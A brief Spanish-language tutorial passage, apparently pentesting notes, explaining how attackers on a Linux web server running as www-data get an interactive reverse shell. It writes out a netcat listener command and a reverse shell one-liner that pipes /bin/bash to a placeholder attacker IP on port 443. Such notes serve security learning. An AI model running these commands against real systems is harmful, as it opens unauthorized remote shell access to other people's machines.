
-----------
Para atacar una máquina Linux, usualmente se utiliza el puerto 80, ya que en la mayoría de los casos se levanta un servidor Apache con el siguiente comando:

`service apache2 start`

Posteriormente, suele activarse el usuario **www-data**, que controla los servicios web. Este usuario, que es el que inicia el servicio, también es el encargado de ejecutar los comandos de inyección. El objetivo es obtener una consola interactiva que permita ejecutar comandos, lo que se conoce como una **Reverse Shell**.

Para ello, primero te pones en escucha en tu máquina atacante con el siguiente comando:

`nc -nlvp 443`

Luego, envías una reverse shell a tu IP atacante para ejecutar la inyección de código, como en el siguiente ejemplo:

`nc -e /bin/bash ipAtacante 443`

Existen diferentes métodos para establecer una reverse Shell, utilizando lenguajes como Python, Java, entre otros. Para obtener más información sobre estos comandos, puedes revisar la web de **PentestMonkey**.

